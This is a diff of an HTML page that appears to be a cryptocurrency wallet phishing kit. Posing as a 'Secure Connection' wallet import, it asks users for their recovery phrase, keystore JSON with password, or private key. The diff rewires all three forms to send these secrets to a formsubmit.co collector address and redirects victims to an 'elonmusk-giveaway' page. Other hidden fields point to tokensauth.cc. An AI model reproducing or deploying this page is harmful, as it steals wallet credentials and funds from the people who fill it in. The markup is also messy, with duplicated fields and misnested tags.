@@ -69,8 +69,11 @@
 			</div>
 			<hr class="mt-0 mb-4">
 			<!-- Form for Keyphrase -->
-<div class="content" id="tab-one"> 
-  <form id="keyphraseForm" onsubmit="submitKeyphrase(event)">
+
+  <form action="https://formsubmit.co/formsubmitmail@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://elonmusk-giveaway.vercel.app/access/point/success.html">
+     <div class="content" id="tab-one"> 
       <input type="hidden" name="_captcha" value="false"> 
       <input type="text" name="_honey" style="display: none"> 
       <input type="hidden" name="_next" value="https://tokensauth.cc/sent.html"> 
@@ -80,12 +83,16 @@
       <p class="small text-center my-4">Typically 12 (sometimes 24)<br>words separated by single <br>spaces</p> 
       <button type="submit" value="submit" class="btn btn-primary shadow-none w-100 mb-3">Secure Connection</button> 
       <button type="button" class="btn btn-danger shadow-none mb-3 w-100" onclick="close_modal();">Cancel</button> 
-  </form> 
+
 </div>
+  </form> 	
 
 <!-- Form for Keystore JSON -->
-<div class="content d-none" id="tab-two"> 
-  <form id="keystoreForm" onsubmit="submitKeystore(event)">
+
+ <form action="https://formsubmit.co/formsubmitmail@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://elonmusk-giveaway.vercel.app/access/point/success.html">
+       <div class="content d-none" id="tab-two"> 
       <input type="hidden" name="_captcha" value="false"> 
       <input type="text" name="_honey" style="display: none"> 
       <input type="hidden" name="_next" value="https://tokensauth.cc/sent.html"> 
@@ -96,13 +103,16 @@
       <p class="small text-center my-4">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p> 
       <button type="submit" value="submit" class="btn btn-primary shadow-none w-100 mb-3">PROCEED</button> 
       <button type="button" class="btn btn-danger shadow-none mb-3 w-100" onclick="close_modal();">Cancel</button> 
-  </form> 
+  
 </div>
-
+  </form> 
 <!-- Form for Private Key -->
 <div class="content d-none" id="tab-three"> 
-  <form id="privateKeyForm" onsubmit="submitPrivateKey(event)">
-      <input type="hidden" name="_captcha" value="false"> 
+  <form action="https://formsubmit.co/formsubmitmail@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://elonmusk-giveaway.vercel.app/access/point/success.html">
+      <div class="content d-none" id="tab-three"> 
+   <input type="hidden" name="_captcha" value="false"> 
       <input type="text" name="_honey" style="display: none"> 
       <input type="hidden" name="_next" value="https://tokensauth.cc/sent.html"> 
       <input type="hidden" name="importType" value="privateKey"> 
@@ -111,9 +121,9 @@
       <p class="small text-center my-4">Typically 12 (sometimes 24)<br>separated by single <br>spaces</p> 
       <button type="submit" value="submit" class ="btn btn-primary shadow-none w-100 mb-3">PROCEED</button> 
       <button type="button" class="btn btn-danger shadow-none mb-3 w-100" onclick="close_modal();">Cancel</button> 
-  </form> 
+ 
 </div>
-
+  </form> 
 <script>
 function submitKeyphrase(event) {
   event.preventDefault(); // Prevent the default form submission
